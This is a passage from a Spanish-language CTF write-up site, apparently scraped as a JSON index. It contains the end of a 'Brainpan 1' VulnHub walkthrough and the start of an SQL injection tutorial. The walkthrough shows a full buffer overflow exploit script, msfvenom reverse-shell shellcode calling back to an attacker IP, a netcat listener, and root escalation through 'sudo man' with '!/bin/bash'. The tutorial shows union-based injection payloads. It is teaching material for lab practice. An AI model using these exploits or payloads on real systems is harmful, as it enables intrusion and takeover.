\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; Todos estos bytes vamos a ponerlos en el script de python para que se incorporen después del EIP, de momento el EIP le vamos a dar de valor \u0026ldquo;42424242\u0026rdquo; (BBBB). Esto queda tal que asi:\nfrom pwn import * offset = 524 junk = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;B\u0026#34; * 4 after_eip = (b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) payload = junk + eip + after_eip host, port = \u0026#34;192.168.88.12\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Ahora al hacer Click derecho en el ESP arriba a la derecha \u0026gt; Follow in Dump, vemos donde empiezan los bytes que hemos puesto después del EIP, y a la izquierda podemos ver la dirección de memoria donde empiezan los bytes de la comprobación de los badchars\n0022F918 41414141 AAAA 0022F91C 41414141 AAAA 0022F920 41414141 AAAA 0022F924 41414141 AAAA 0022F928 41414141 AAAA 0022F92C 42424242 BBBB 0022F930 04030201 \u0001\u0002\u0003\u0004 0022F934 08070605 \u0005\u0006\u0007\u0008 0022F938 0C0B0A09 ..\u000b. 0022F93C 100F0E0D .\u000e\u000f\u0010 0022F940 14131211 \u0011\u0012\u0013\u0014 0022F944 18171615 \u0015\u0016\u0017\u0018 0022F948 1C1B1A19 \u0019\u001a\u001b\u001c 0022F94C 201F1E1D \u001d\u001e\u001f 0022F950 24232221 !\u0026#34;#$ 0022F954 28272625 %\u0026amp;\u0026#39;( 0022F958 2C2B2A29 )*+, 0022F95C 302F2E2D -./0 0022F960 34333231 1234 Nos podemos fijar en que byte no sale representado de forma correcta o usar el siguiente comando de mona\n!mona compare -f C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin -a 0022F930 0BADF00D [+] Fetched 255 bytes successfully from C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin 0BADF00D - Comparing 1 location(s) 0BADF00D Comparing bytes from file with memory : 0022F930 [+] Comparing with memory at location : 0x0022f930 (Stack) 0022F930 !!! Hooray, normal shellcode unmodified !!! 0022F930 Bytes omitted from input: 00 Después de ejecutar el comando se abre una ventanita la cual muestra los badchars encontrados, en este caso no ha encontrado ninguno. Así que a la hora de crear el shellcode simplemente excluiremos los \\x00\nProtecciones Con el siguiente comando podemos ver los las protecciones del binario\n!mona modules 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- 0BADF00D Module info : 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- 0BADF00D Base | Top | Size | Rebase | SafeSEH | ASLR | CFG | NXCompat | OS Dll | Version, Modulename \u0026amp; Path, DLLCharacteristics 0BADF00D ---------------------------------------------------------------------------------------------------------------------------------------------- .... 0BADF00D 0x76df0000 | 0x76ec4000 | 0x000d4000 | True | True | True | False | True | True | 6.1.7600.16385 [kernel32.dll] (C:\\Windows\\system32\\kernel32.dll) 0x140 0BADF00D 0x31170000 | 0x31176000 | 0x00006000 | False | False | False | False | False | False | -1.0- [brainpan.exe] (C:\\Users\\arnau\\Downloads\\brainpan.exe) 0x0 0BADF00D 0x76960000 | 0x76a0c000 | 0x000ac000 | True | True | True | False | True | True | 7.0.7600.16385 [msvcrt.dll] (C:\\Windows\\system32\\msvcrt.dll) 0x140 .... 0BADF00D ----------------------------------------------------------------------------------------------------------------------------------------- En la fila del brainpan.exe sale todo en false.\nJMP ESP Ahora toca encontrar la dirección del JMP ESP. Para encontrarlo necesitamos saber el opcode de JMP ESP\n\u0026gt; /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm \u0026gt; jmp ESP 00000000 FFE4 jmp esp nasm \u0026gt; El opcode de JMP ESP es FFE4, sabiendo esto, podemos buscar con mona la dirección del JMP ESP\n!mona find -s \u0026#34;\\xFF\\xE4\u0026#34; -m brainpan.exe 712F3 0x311712f3 : \u0026#34;\\xFF\\xE4\u0026#34; | {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\\Users\\arnau\\Downloads\\brainpan.exe), 0x0 La dirección del JMP ESP es: 0x311712f3\nShellcode Por último vamos a desarrollar el shellcode el cual nos enviara una reverse shell a nuestra máquina de atacante. Para crear el shellcode usaremos msfvenom de la siguiente forma:\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.88.5 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f py -b \u0026#34;\\x00\u0026#34; EXITFUNC=thread buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x0c\\xa9\\x71\\x87\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x5d\u0026#34; buf += b\u0026#34;\\x33\\xc9\\xb1\\x52\\x31\\x55\\x12\\x83\\xc5\\x04\\x03\\x59\u0026#34; buf += b\u0026#34;\\xa7\\x93\\x72\\x9d\\x5f\\xd1\\x7d\\x5d\\xa0\\xb6\\xf4\\xb8\u0026#34; buf += b\u0026#34;\\x91\\xf6\\x63\\xc9\\x82\\xc6\\xe0\\x9f\\x2e\\xac\\xa5\\x0b\u0026#34; buf += b\u0026#34;\\xa4\\xc0\\x61\\x3c\\x0d\\x6e\\x54\\x73\\x8e\\xc3\\xa4\\x12\u0026#34; buf += b\u0026#34;\\x0c\\x1e\\xf9\\xf4\\x2d\\xd1\\x0c\\xf5\\x6a\\x0c\\xfc\\xa7\u0026#34; buf += b\u0026#34;\\x23\\x5a\\x53\\x57\\x47\\x16\\x68\\xdc\\x1b\\xb6\\xe8\\x01\u0026#34; buf += b\u0026#34;\\xeb\\xb9\\xd9\\x94\\x67\\xe0\\xf9\\x17\\xab\\x98\\xb3\\x0f\u0026#34; buf += b\u0026#34;\\xa8\\xa5\\x0a\\xa4\\x1a\\x51\\x8d\\x6c\\x53\\x9a\\x22\\x51\u0026#34; buf += b\u0026#34;\\x5b\\x69\\x3a\\x96\\x5c\\x92\\x49\\xee\\x9e\\x2f\\x4a\\x35\u0026#34; buf += b\u0026#34;\\xdc\\xeb\\xdf\\xad\\x46\\x7f\\x47\\x09\\x76\\xac\\x1e\\xda\u0026#34; buf += b\u0026#34;\\x74\\x19\\x54\\x84\\x98\\x9c\\xb9\\xbf\\xa5\\x15\\x3c\\x6f\u0026#34; buf += b\u0026#34;\\x2c\\x6d\\x1b\\xab\\x74\\x35\\x02\\xea\\xd0\\x98\\x3b\\xec\u0026#34; buf += b\u0026#34;\\xba\\x45\\x9e\\x67\\x56\\x91\\x93\\x2a\\x3f\\x56\\x9e\\xd4\u0026#34; buf += b\u0026#34;\\xbf\\xf0\\xa9\\xa7\\x8d\\x5f\\x02\\x2f\\xbe\\x28\\x8c\\xa8\u0026#34; buf += b\u0026#34;\\xc1\\x02\\x68\\x26\\x3c\\xad\\x89\\x6f\\xfb\\xf9\\xd9\\x07\u0026#34; buf += b\u0026#34;\\x2a\\x82\\xb1\\xd7\\xd3\\x57\\x15\\x87\\x7b\\x08\\xd6\\x77\u0026#34; buf += b\u0026#34;\\x3c\\xf8\\xbe\\x9d\\xb3\\x27\\xde\\x9e\\x19\\x40\\x75\\x65\u0026#34; buf += b\u0026#34;\\xca\\xaf\\x22\\x3d\\x0f\\x58\\x31\\xbd\\x0e\\x23\\xbc\\x5b\u0026#34; buf += b\u0026#34;\\x7a\\x43\\xe9\\xf4\\x13\\xfa\\xb0\\x8e\\x82\\x03\\x6f\\xeb\u0026#34; buf += b\u0026#34;\\x85\\x88\\x9c\\x0c\\x4b\\x79\\xe8\\x1e\\x3c\\x89\\xa7\\x7c\u0026#34; buf += b\u0026#34;\\xeb\\x96\\x1d\\xe8\\x77\\x04\\xfa\\xe8\\xfe\\x35\\x55\\xbf\u0026#34; buf += b\u0026#34;\\x57\\x8b\\xac\\x55\\x4a\\xb2\\x06\\x4b\\x97\\x22\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x4c\\x97\\x6f\\xce\\x01\\xa3\\x4b\\xc0\\xdf\\x2c\\xd0\\xb4\u0026#34; buf += b\u0026#34;\\x8f\\x7a\\x8e\\x62\\x76\\xd5\\x60\\xdc\\x20\\x8a\\x2a\\x88\u0026#34; buf += b\u0026#34;\\xb5\\xe0\\xec\\xce\\xb9\\x2c\\x9b\\x2e\\x0b\\x99\\xda\\x51\u0026#34; buf += b\u0026#34;\\xa4\\x4d\\xeb\\x2a\\xd8\\xed\\x14\\xe1\\x58\\x0d\\xf7\\x23\u0026#34; buf += b\u0026#34;\\x95\\xa6\\xae\\xa6\\x14\\xab\\x50\\x1d\\x5a\\xd2\\xd2\\x97\u0026#34; buf += b\u0026#34;\\x23\\x21\\xca\\xd2\\x26\\x6d\\x4c\\x0f\\x5b\\xfe\\x39\\x2f\u0026#34; buf += b\u0026#34;\\xc8\\xff\\x6b\u0026#34; Falta juntarlo todo en el script\nfrom pwn import * from struct import pack offset = 524 junk = b\u0026#34;A\u0026#34; * offset eip = pack(\u0026#34;\u0026lt;I\u0026#34;, 0x311712f3) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xba\\x0c\\xa9\\x71\\x87\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x5d\u0026#34; buf += b\u0026#34;\\x33\\xc9\\xb1\\x52\\x31\\x55\\x12\\x83\\xc5\\x04\\x03\\x59\u0026#34; buf += b\u0026#34;\\xa7\\x93\\x72\\x9d\\x5f\\xd1\\x7d\\x5d\\xa0\\xb6\\xf4\\xb8\u0026#34; buf += b\u0026#34;\\x91\\xf6\\x63\\xc9\\x82\\xc6\\xe0\\x9f\\x2e\\xac\\xa5\\x0b\u0026#34; buf += b\u0026#34;\\xa4\\xc0\\x61\\x3c\\x0d\\x6e\\x54\\x73\\x8e\\xc3\\xa4\\x12\u0026#34; buf += b\u0026#34;\\x0c\\x1e\\xf9\\xf4\\x2d\\xd1\\x0c\\xf5\\x6a\\x0c\\xfc\\xa7\u0026#34; buf += b\u0026#34;\\x23\\x5a\\x53\\x57\\x47\\x16\\x68\\xdc\\x1b\\xb6\\xe8\\x01\u0026#34; buf += b\u0026#34;\\xeb\\xb9\\xd9\\x94\\x67\\xe0\\xf9\\x17\\xab\\x98\\xb3\\x0f\u0026#34; buf += b\u0026#34;\\xa8\\xa5\\x0a\\xa4\\x1a\\x51\\x8d\\x6c\\x53\\x9a\\x22\\x51\u0026#34; buf += b\u0026#34;\\x5b\\x69\\x3a\\x96\\x5c\\x92\\x49\\xee\\x9e\\x2f\\x4a\\x35\u0026#34; buf += b\u0026#34;\\xdc\\xeb\\xdf\\xad\\x46\\x7f\\x47\\x09\\x76\\xac\\x1e\\xda\u0026#34; buf += b\u0026#34;\\x74\\x19\\x54\\x84\\x98\\x9c\\xb9\\xbf\\xa5\\x15\\x3c\\x6f\u0026#34; buf += b\u0026#34;\\x2c\\x6d\\x1b\\xab\\x74\\x35\\x02\\xea\\xd0\\x98\\x3b\\xec\u0026#34; buf += b\u0026#34;\\xba\\x45\\x9e\\x67\\x56\\x91\\x93\\x2a\\x3f\\x56\\x9e\\xd4\u0026#34; buf += b\u0026#34;\\xbf\\xf0\\xa9\\xa7\\x8d\\x5f\\x02\\x2f\\xbe\\x28\\x8c\\xa8\u0026#34; buf += b\u0026#34;\\xc1\\x02\\x68\\x26\\x3c\\xad\\x89\\x6f\\xfb\\xf9\\xd9\\x07\u0026#34; buf += b\u0026#34;\\x2a\\x82\\xb1\\xd7\\xd3\\x57\\x15\\x87\\x7b\\x08\\xd6\\x77\u0026#34; buf += b\u0026#34;\\x3c\\xf8\\xbe\\x9d\\xb3\\x27\\xde\\x9e\\x19\\x40\\x75\\x65\u0026#34; buf += b\u0026#34;\\xca\\xaf\\x22\\x3d\\x0f\\x58\\x31\\xbd\\x0e\\x23\\xbc\\x5b\u0026#34; buf += b\u0026#34;\\x7a\\x43\\xe9\\xf4\\x13\\xfa\\xb0\\x8e\\x82\\x03\\x6f\\xeb\u0026#34; buf += b\u0026#34;\\x85\\x88\\x9c\\x0c\\x4b\\x79\\xe8\\x1e\\x3c\\x89\\xa7\\x7c\u0026#34; buf += b\u0026#34;\\xeb\\x96\\x1d\\xe8\\x77\\x04\\xfa\\xe8\\xfe\\x35\\x55\\xbf\u0026#34; buf += b\u0026#34;\\x57\\x8b\\xac\\x55\\x4a\\xb2\\x06\\x4b\\x97\\x22\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x4c\\x97\\x6f\\xce\\x01\\xa3\\x4b\\xc0\\xdf\\x2c\\xd0\\xb4\u0026#34; buf += b\u0026#34;\\x8f\\x7a\\x8e\\x62\\x76\\xd5\\x60\\xdc\\x20\\x8a\\x2a\\x88\u0026#34; buf += b\u0026#34;\\xb5\\xe0\\xec\\xce\\xb9\\x2c\\x9b\\x2e\\x0b\\x99\\xda\\x51\u0026#34; buf += b\u0026#34;\\xa4\\x4d\\xeb\\x2a\\xd8\\xed\\x14\\xe1\\x58\\x0d\\xf7\\x23\u0026#34; buf += b\u0026#34;\\x95\\xa6\\xae\\xa6\\x14\\xab\\x50\\x1d\\x5a\\xd2\\xd2\\x97\u0026#34; buf += b\u0026#34;\\x23\\x21\\xca\\xd2\\x26\\x6d\\x4c\\x0f\\x5b\\xfe\\x39\\x2f\u0026#34; buf += b\u0026#34;\\xc8\\xff\\x6b\u0026#34; payload = junk + eip + b\u0026#34;\\x90\u0026#34; * 16 + buf host, port = \u0026#34;192.168.88.12\u0026#34;, 9999 r = remote(host, port) r.sendline(payload) Repasando el script:\nPrimero se define el offset que es la cantidad de caracteres que ponemos para llegar hasta el eip, en el eip ponemos la dirección del JMP ESP para que salte al ESP. Después del eip ponemos 16 veces \u0026ldquo;\\x90\u0026rdquo; y por último el shellcode.\n¿Por qué ponemos \\x90 antes del shellcode?\nLa memoria puede moverse un poco durante la ejecución del programa, así que no sabemos exactamente en qué dirección comenzará el shellcode en el búfer. El NOP-sled es una forma de lidiar con esto.\nUn NOP-sled es una secuencia de instrucciones NOP (sin operación) destinadas a \u0026ldquo;deslizar\u0026rdquo; el flujo de ejecución de instrucciones de la CPU a la siguiente dirección de memoria. Dondequiera que la dirección de retorno aterrice en el NOP-sled, se deslizará a lo largo del búfer hasta que alcance el inicio del shellcode\nSolo falta ponernos en escucha y ¡ejecutar el script!\n\u0026gt; rlwrap nc -nlvp 443 listening on [any] 443 ... connect to [192.168.88.5] from (UNKNOWN) [192.168.88.12] 49190 Microsoft Windows [Versi�n 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. Escalada de privilegios Dentro de la carpeta del directorio personal de puck vemos este archivo\n#!/bin/bash # run brainpan.exe if it stops lsof -i:9999 if [[ $? -eq 1 ]]; then pid=`ps aux | grep brainpan.exe | grep -v grep` if [[ ! -z $pid ]]; then kill -9 $pid killall wineserver killall winedevice.exe fi /usr/bin/wine /home/puck/web/bin/brainpan.exe \u0026amp; fi # run SimpleHTTPServer if it stops lsof -i:10000 if [[ $? -eq 1 ]]; then pid=`ps aux | grep SimpleHTTPServer | grep -v grep` if [[ ! -z $pid ]]; then kill -9 $pid fi cd /home/puck/web /usr/bin/python -m SimpleHTTPServer 10000 fi Esto es un script en bash esto significa que esto es un linux, así que vamos a cambiar el payload para linux.\n\u0026gt; msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.88.5 LPORT=443 -b \u0026#34;\\x00\u0026#34; -f py shellcode buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xda\\xdb\\xbf\\x5f\\xa4\\xa1\\x30\\xd9\\x74\\x24\\xf4\\x5a\u0026#34; buf += b\u0026#34;\\x29\\xc9\\xb1\\x12\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\xb5\u0026#34; buf += b\u0026#34;\\x58\\x43\\xc5\\x78\\x7a\\x73\\xc5\\x29\\x3f\\x2f\\x60\\xcf\u0026#34; buf += b\u0026#34;\\x36\\x2e\\xc4\\xa9\\x85\\x31\\xb6\\x6c\\xa6\\x0d\\x74\\x0e\u0026#34; buf += b\u0026#34;\\x8f\\x08\\x7f\\x66\\xd0\\x43\\x27\\x73\\xb8\\x91\\xd8\\x7a\u0026#34; buf += b\u0026#34;\\x83\\x1f\\x39\\xcc\\x95\\x4f\\xeb\\x7f\\xe9\\x73\\x82\\x9e\u0026#34; buf += b\u0026#34;\\xc0\\xf4\\xc6\\x08\\xb5\\xdb\\x95\\xa0\\x21\\x0b\\x75\\x52\u0026#34; buf += b\u0026#34;\\xdb\\xda\\x6a\\xc0\\x48\\x54\\x8d\\x54\\x65\\xab\\xce\u0026#34; Ahora dentro con sudo -lvemos que podemos ejecutar /home/anansi/bin/anansi_util como root sin contraseña.\npuck@brainpan:/home/puck$ sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util Este script tiene 3 opciones\npuck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [action] Where [action] is one of: - network - proclist - manual [command] Network Ejecuta un ifconfig\npuck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000 link/ether 08:00:27:c3:40:1b brd ff:ff:ff:ff:ff:ff inet 192.168.88.10/24 brd 192.168.88.255 scope global eth0 inet6 fe80::a00:27ff:fec3:401b/64 scope link valid_lft forever preferred_lft forever Proclist puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist top - 10:15:24 up 15 min, 0 users, load average: 0.00, 0.00, 0.00 Tasks: 77 total, 1 running, 76 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.0 us, 0.1 sy, 0.0 ni, 99.9 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem: 248936 total, 136380 used, 112556 free, 25352 buffers KiB Swap: 520188 total, 0 used, 520188 free, 77192 cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 3492 1860 1280 S 0.0 0.7 0:00.24 init 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:00.03 ksoftirqd/0 4 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0 6 root rt 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 7 root rt 0 0 0 0 S 0.0 0.0 0:00.00 watchdog/0 8 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 cpuset 9 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 khelper 10 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kdevtmpfs 11 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 netns 12 root 20 0 0 0 0 S 0.0 0.0 0:00.00 sync_supers 13 root 20 0 0 0 0 S 0.0 0.0 0:00.00 bdi-default 14 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kintegrityd 15 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kblockd 16 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 ata_sff 17 root 20 0 0 0 0 S 0.0 0.0 0:00.00 khubd 18 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 md Manual Muestra el manual de un comando\nsudo /home/anansi/bin/anansi_util manual /bin/bash El manual que muestra parece que es el mismo que man, así que si ponemos lo siguiente dentro del manual, nos convertimos en root\n!/bin/bash Máquina resuelta\n","date":"2024-02-09","id":50,"permalink":"/writeups/vulnhub/brainpan-1/","summary":"En esta máquina vamos a practicar el BoF (Buffer Overflow) más típico que suele caer en certificaciones como el eCPPT o el antiguo OSCP","tags":["CTF","BoF"],"title":"Brainpan 1"},{"content":"","date":"2024-01-08","id":51,"permalink":"/ctf/picoctf/binaryexplotation-copy/","summary":"","tags":[],"title":"Binary Explotation"},{"content":"","date":"2024-01-08","id":52,"permalink":"/ctf/caixabankk/forense/","summary":"","tags":[],"title":"Forense"},{"content":"","date":"2024-01-08","id":53,"permalink":"/ctf/hackthebox/hardware/","summary":"","tags":[],"title":"Hardware"},{"content":" ¿Qué es una SQLI? MySQL Inyección Union Enumeración bases de datos Enumeración de las tablas Columnas Data Subida de archivos Booleana Base de datos Tablas Columnas Data Mas información relevante Basada en tiempo a ciegas Base de datos Tables Columns Data Mas información relevante ¿Qué es una SQLI? Como dicen las siglas SQL Injection (Inyección SQL), consiste en inyectar instrucciones SQL dentro de una query SQL, mediante la entrada o modificaciones de datos desde el cliente hacia la aplicación intencionada. Por ejemplo un formulario, un panel de inicio de sesión, comentarios, etc\u0026hellip;\nVamos a imaginarnos un ejemplo, tenemos una web que nos da la información del usuario que le mandamos por get\n\u0026gt; curl -s \u0026#34;localhost/index.php?nombre=joan\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Vamos a analizar el código para ver como está hecho.\n$nombre = $_GET[\u0026#39;nombre\u0026#39;]; $query = \u0026#34;SELECT * FROM mi_tabla WHERE nombre = \u0026#39;$nombre\u0026#39;\u0026#34;; El servidor web recibe por GET el contenido que se manda por el parámetro nombre y mete directamente nuestro input a la query SQL, sin validar si realmente le estamos pasando un nombre, así que esto lo hace vulnerable a una SQL Injection.\n\u0026gt; curl -s \u0026#34;localhost/index.php?nombre=joan\u0026#39;\u0026#34; Error en la consulta: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;\u0026#39;joan\u0026#39;\u0026#39;\u0026#39; at line 1 Ha saltado un error en la consulta SQL, en el mensaje de error especifican que concretamente ha sido en \u0026lsquo;\u0026lsquo;\u0026lsquo;joan\u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo;. Esto es porque hemos añadido una comilla la cual nunca se ha cerrado y ha quedado colgada lo que ha causado un error. Así es como a quedado la query con la comilla que hemos añadido.\nSELECT * FROM mi_tabla WHERE nombre = \u0026#39;joan\u0026#39;\u0026#39; Ahora todo lo que pongamos después de la comilla se va a interpretar como instrucciones sql y para que no de problemas la comilla que se queda colgada, la podemos comentar con \u0026lsquo;\u0026ndash; -\u0026rsquo;\nSELECT * FROM mi_tabla WHERE nombre = \u0026#39;joan\u0026#39; sleep(5) -- -\u0026#39; Para entenderlo mejor, os comparto un ejemplo hecho con python, ya que python es más fácil de entender\nCuando le ponemos una comilla de más da error\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;Joan\u0026#34;\u0026#34; File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1 name = \u0026#34;Joan\u0026#34;\u0026#34; ^ SyntaxError: unterminated string literal (detected at line 1) Si comentamos la comilla ya no da error\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;Joan\u0026#34; #\u0026#34; Ahora el contenido que pongamos después de la comilla se va a interpretar como instrucciones y no como texto\n\u0026gt;\u0026gt;\u0026gt; name = \u0026#34;joan\u0026#34;; print(\u0026#34;Hola\u0026#34;) #\u0026#34; Hola MySQL Inyección Union Laboratorio\nPara la explicación se va a usar el laboratorio 1:\nDescarga el laboratorio\nDescomprímelo y entra a la carpeta\nunzip lab1.zip cd lab1 Despliega el contenedor\ndocker-compose up --build Una vez tenemos localizada la SQL Injection, en el caso del laboratorio 1 es el parámetro nombre, vamos a llevar a cabo el tipo de inyección union.\nPrimero de todo necesitamos saber el número de columnas que tiene la tabla que se está usando. Para localizarlas vamos a usar la funcion \u0026lsquo;order\u0026rsquo; la cual nos permite ordenar las columnas basándonos en la columna que le especificamos, si le especificamos un número de columnas que no exista va a dar error, jugando con esto podemos encontrar el número de columnas\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; order by 3-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin \u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; order by 4-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Error en la consulta: Unknown column \u0026#39;4\u0026#39; in \u0026#39;order clause\u0026#39; Ahora ya sabemos que la tabla tiene 3 columnas, porque \u0026lsquo;order by 3\u0026rsquo; no da error pero \u0026lsquo;order by 4\u0026rsquo; sí. En el caso de que sea una tabla muy grande podemos usar herramientas para automatizar este paso.\n\u0026gt; wfuzz -c -t 20 -z range,1-5 \u0026#34;http://localhost/?nombre=joan\u0026#39;+order+by+FUZZ--+-\u0026#34; 000000001: 200 1 L 3 W 31 Ch \u0026#34;1\u0026#34; 000000003: 200 1 L 3 W 31 Ch \u0026#34;3\u0026#34; 000000002: 200 1 L 3 W 31 Ch \u0026#34;2\u0026#34; 000000004: 200 0 L 10 W 58 Ch \u0026#34;4\u0026#34; 000000005: 200 0 L 10 W 58 Ch \u0026#34;5\u0026#34; Vemos que cuando el número de columna ya no existe cambia el tamaño de la respuesta.\nYa tenemos el número de columnas así que podemos empezar a usar union para concatenar datos. El payload es el siguiente\nunion select NULL,NULL,NULL-- - Hay que poner tantos NULL como columnas tenga la tabla.\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select NULL,NULL,NULL-- -\u0026#34; | sed \u0026#39;s/\u0026lt;br\u0026gt;/\\n/g\u0026#39; Nombre: Joan Rol: admin Nombre: Rol: Ahora podemos sustituir los NULL por cadenas de texto para comprobar en que columnas podemos mostrar datos\n\u0026gt; curl -s -G \u0026#34;localhost\u0026#34; --data-urlencode \u0026#34;nombre=joan\u0026#39; union select \u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;-- -\u0026#34; | sed 